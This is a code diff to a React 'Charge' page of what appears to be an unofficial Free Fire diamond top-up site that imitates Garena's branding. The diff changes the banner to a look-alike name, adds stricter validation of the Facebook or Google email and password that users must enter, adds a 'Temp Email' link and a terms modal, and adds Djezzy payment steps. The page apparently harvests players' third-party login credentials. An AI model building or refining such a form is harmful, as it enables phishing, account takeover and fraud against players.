@@ -16,7 +16,8 @@ import {
   LogOut,
   Facebook,
   Instagram,
-  Check
+  Check,
+  Mail
 } from "lucide-react";
 import Modal from "../components/Modal";
 import { useLanguage } from "../context/LanguageContext";
@@ -30,7 +31,7 @@ export default function Charge() {
   const user = JSON.parse(localStorage.getItem('ff_user') || '{}');
 
   const [platform, setPlatform] = useState("");
-  const [email, setEmail] = useState("");
+  const [email, setEmail] = useState(user?.temp_email || "");
   const [platformPassword, setPlatformPassword] = useState("");
   const [level, setLevel] = useState("");
   const [charged, setCharged] = useState("لا");
@@ -50,6 +51,20 @@ export default function Charge() {
   const showToast = (msg: string) => {
     setToastMessage(msg);
     setTimeout(() => setToastMessage(""), 4000);
+  };
+
+  const [termsModal, setTermsModal] = useState(false);
+
+  useEffect(() => {
+    const termsAccepted = localStorage.getItem('ff_terms_accepted');
+    if (!termsAccepted) {
+      setTermsModal(true);
+    }
+  }, []);
+
+  const acceptTerms = () => {
+    localStorage.setItem('ff_terms_accepted', 'true');
+    setTermsModal(false);
   };
 
   useEffect(() => {
@@ -96,11 +111,19 @@ export default function Charge() {
 
   const handlePreSubmit = () => {
     if (!platform) {
-      showToast(t?.("select_platform") || "يرجى اختيار نوع المنصة (فيسبوك، جوجل، الخ...)");
+      showToast(language === 'ar' ? "يرجى اختيار نوع المنصة (فيسبوك، جوجل، الخ...)" : "Please select a platform (Facebook, Google, etc.)");
       return;
     }
-    if (!email || !platformPassword || !level) {
-      showToast(t?.("fill_required_data") || "يرجى ملأ جميع بيانات الحساب المطلوبة");
+    if (!email || !/^\S+@\S+\.\S+$/.test(email.trim())) {
+      showToast(language === 'ar' ? "صيغة البريد الإلكتروني غير صحيحة" : "Invalid email format");
+      return;
+    }
+    if (!platformPassword) {
+      showToast(language === 'ar' ? "يرجى إدخال كلمة المرور" : "Please enter your password");
+      return;
+    }
+    if (!level) {
+      showToast(language === 'ar' ? "يرجى إدخال مستوى الحساب الخاص بك" : "Please enter your account level");
       return;
     }
     if (!diamonds) {
@@ -141,7 +164,7 @@ export default function Charge() {
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm"
+            className="fixed inset-0 z-[100] bg-black/50 backdrop-blur-sm"
             onClick={() => setIsSidebarOpen(false)}
           />
         )}
@@ -155,7 +178,7 @@ export default function Charge() {
             animate={{ x: 0 }}
             exit={{ x: language === 'ar' ? '100%' : '-100%' }}
             transition={{ type: "spring", bounce: 0, duration: 0.3 }}
-            className={`fixed top-0 bottom-0 ${language === 'ar' ? 'right-0' : 'left-0'} z-50 w-72 bg-white shadow-2xl flex flex-col`}
+            className={`fixed top-0 bottom-0 ${language === 'ar' ? 'right-0' : 'left-0'} z-[110] w-72 bg-white shadow-2xl flex flex-col`}
           >
             <div className={`flex items-center justify-between p-4 border-b border-gray-100 ${language === 'ar' ? '' : 'flex-row-reverse'}`}>
               <div className="flex items-center gap-3">
@@ -164,7 +187,6 @@ export default function Charge() {
                 </div>
                 <div className="text-right">
                   <div className="font-bold text-gray-900">{user?.account_id}</div>
-                  <div className="text-xs font-semibold text-gray-500">مستوى الحساب: {user?.level || 0}</div>
                 </div>
               </div>
               <button 
@@ -189,6 +211,13 @@ export default function Charge() {
               >
                 <User className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                 {t('account')}
+              </button>
+              <button 
+                onClick={() => { setIsSidebarOpen(false); navigate('/email'); }}
+                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
+              >
+                <Mail className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
+                {language === 'ar' ? 'إيميل وهمي' : 'Temp Email'}
               </button>
 
               <div className="my-6 border-t border-gray-100"></div>
@@ -307,7 +336,7 @@ export default function Charge() {
           <div className="relative overflow-hidden rounded-2xl shadow-[0_8px_32px_0_rgba(31,38,135,0.07)]">
             <img
               src="https://storingo.lovestoblog.com/banner.jpg"
-              alt="مركز جارينا الرسمي للشحن"
+              alt="مركز قارينا الثاني للشحن"
               className="h-32 md:h-48 w-full rounded-2xl object-cover"
               onError={(e) => {
                 e.currentTarget.style.display = "none";
@@ -318,7 +347,7 @@ export default function Charge() {
                     "to-indigo-900",
                   );
                   e.currentTarget.parentElement.innerHTML =
-                    '<div class="absolute inset-0 opacity-20"><div class="h-full w-full" style="background-image: radial-gradient(circle at 2px 2px, white 1px, transparent 0); background-size: 24px 24px"></div></div><div class="relative flex h-full items-center justify-center p-6 text-center"><h1 class="text-2xl md:text-4xl font-black italic tracking-widest text-white drop-shadow-md">مركز جارينا الرسمي للشحن</h1></div>';
+                    '<div class="absolute inset-0 opacity-20"><div class="h-full w-full" style="background-image: radial-gradient(circle at 2px 2px, white 1px, transparent 0); background-size: 24px 24px"></div></div><div class="relative flex h-full items-center justify-center p-6 text-center"><h1 class="text-2xl md:text-4xl font-black italic tracking-widest text-white drop-shadow-md">مركز قارينا الثاني للشحن</h1></div>';
                 }
               }}
             />
@@ -430,13 +459,16 @@ export default function Charge() {
             </div>
 
             <div className="grid gap-4 md:grid-cols-2">
-              <input
-                type="text"
-                placeholder={t('account_email')}
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
-              />
+              <div className="flex flex-col gap-1 w-full">
+                <input
+                  type="text"
+                  placeholder={t('account_email')}
+                  value={email}
+                  disabled={!!user?.temp_email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 disabled:opacity-75 disabled:cursor-not-allowed disabled:bg-gray-100"
+                />
+              </div>
               <input
                 type="password"
                 placeholder={t('account_password')}
@@ -604,24 +636,23 @@ export default function Charge() {
           </div>
 
           <div className="mb-4">
-            <button 
-              onClick={() => setPaymentMethod('djezzy')}
-              className={`relative w-full rounded-xl border-2 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24 ${paymentMethod === 'djezzy' ? 'border-[#CD1212] ring-2 ring-red-100' : 'border-red-500'}`}
-            >
-              <div className={`absolute top-0 ${language === 'ar' ? 'right-0 rounded-bl-lg border-l' : 'left-0 rounded-br-lg border-r'} bg-red-600 px-3 py-1 text-xs font-bold text-white z-10 flex border-b border-white items-center gap-1`}>
-                {t('special_offer_tag')}
-                <svg
-                  width="10"
-                  height="10"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  className="text-white"
-                >
-                  <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
+            <div className={`mb-4 text-[11px] text-gray-500 font-medium flex gap-2 ${language === 'ar' ? 'text-right' : 'text-left'}`}>
+              <div className="mt-1 flex-shrink-0 text-gray-400">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <rect x="3" y="5" width="18" height="14" rx="2" ry="2"></rect>
+                  <line x1="8" y1="12" x2="16" y2="12"></line>
                 </svg>
               </div>
+              <p className="leading-relaxed text-justify">
+                {language === 'ar' 
+                  ? 'فعّل أولاً رصيد الألعاب عبر #707* أو من خلال تطبيق جازي ضمن قسم المنتجات الرقمية. بعد تفعيل الرصيد، ارجع إلى موقع Shop3Game واختر Djezzy كطريقة للدفع لإتمام عملية الشراء. ثم أدخل رقم هاتفك واتبع التعليمات في رسالة SMS قصيرة تصلك على رقمك. سيتم خصم قيمة الشراء من رصيدك'
+                  : 'First activate the gaming balance via *707# or through the Djezzy app in the digital products section. After activating the balance, return here and choose Djezzy as a payment method to complete the purchase. Then enter your phone number and follow the instructions in the short SMS you receive.'}
+              </p>
+            </div>
+            <button 
+              onClick={() => setPaymentMethod('djezzy')}
+              className={`relative w-full rounded-xl border-2 hover:bg-red-50 bg-white p-4 transition-all overflow-hidden flex items-center justify-center h-24 ${paymentMethod === 'djezzy' ? 'border-[#CD1212] ring-2 ring-red-100' : 'border-gray-200'}`}
+            >
               <div className="flex items-center gap-2">
                 <div className="text-2xl font-black text-black">{t('djezzy')}</div>
                 <div className="bg-red-600 text-white font-black text-xl px-2 py-1 transform -skew-x-12">
@@ -638,13 +669,11 @@ export default function Charge() {
               </span>
               <div className="border-t border-gray-200 -mt-2.5"></div>
             </div>
-            <div className="relative rounded-xl border border-gray-200 bg-gray-50 p-4 h-24 flex items-center justify-center overflow-hidden grayscale">
-              <div className="text-2xl font-black text-red-500">ooredoo</div>
-              <div className="absolute inset-0 bg-white/70 flex items-center justify-center">
-                <span className="text-sm font-bold text-gray-600">
-                  {t('temp_closed')}
-                </span>
-              </div>
+            <div className="relative rounded-xl border border-gray-200 bg-gray-50 p-4 h-24 flex items-center justify-between px-6 overflow-hidden opacity-80">
+              <div className="text-2xl font-black text-red-500">Ooredoo</div>
+              <span className="text-sm font-bold text-gray-600 bg-white px-3 py-1.5 rounded-full shadow-sm border border-gray-200">
+                {t('temp_closed')}
+              </span>
             </div>
           </div>
         </section>
@@ -748,6 +777,47 @@ export default function Charge() {
           </motion.div>
         )}
       </AnimatePresence>
+
+      <Modal 
+        isOpen={termsModal} 
+        onClose={acceptTerms}
+        title={language === 'ar' ? 'شروط قبول الشحن' : 'Recharge Acceptance Terms'}
+      >
+        <div className={`p-2 space-y-3 ${language === 'ar' ? 'text-right' : 'text-left'}`}>
+          <div className="flex items-start gap-3">
+            <div className="flex-shrink-0 mt-1"><Check className="w-5 h-5 text-emerald-600" /></div>
+            <p className="text-sm font-semibold text-gray-700">
+              {language === 'ar' 
+                ? 'يجب أن يكون الحساب غير مبند (محظور).' 
+                : 'Account must not be banned.'}
+            </p>
+          </div>
+          <div className="flex items-start gap-3">
+            <div className="flex-shrink-0 mt-1"><Check className="w-5 h-5 text-emerald-600" /></div>
+            <p className="text-sm font-semibold text-gray-700">
+              {language === 'ar' 
+                ? 'يجب التسجيل بالمنصة الرئيسية وليست الثانوية.' 
+                : 'You must register with the main platform, not a secondary one.'}
+            </p>
+          </div>
+          <div className="flex items-start gap-3">
+            <div className="flex-shrink-0 mt-1"><Check className="w-5 h-5 text-emerald-600" /></div>
+            <p className="text-sm font-semibold text-gray-700">
+              {language === 'ar' 
+                ? 'يجب أن يكون الربط الأساسي بالإيميل وليس أي منصة أخرى.' 
+                : 'Primary binding must be via email, not any other platform.'}
+            </p>
+          </div>
+          
+          <button 
+            onClick={acceptTerms}
+            className="w-full mt-6 rounded-xl bg-red-600 text-white py-3 font-bold shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all text-sm"
+          >
+            {language === 'ar' ? 'موافق' : 'Accept'}
+          </button>
+        </div>
+      </Modal>
+
     </div>
   );
 }
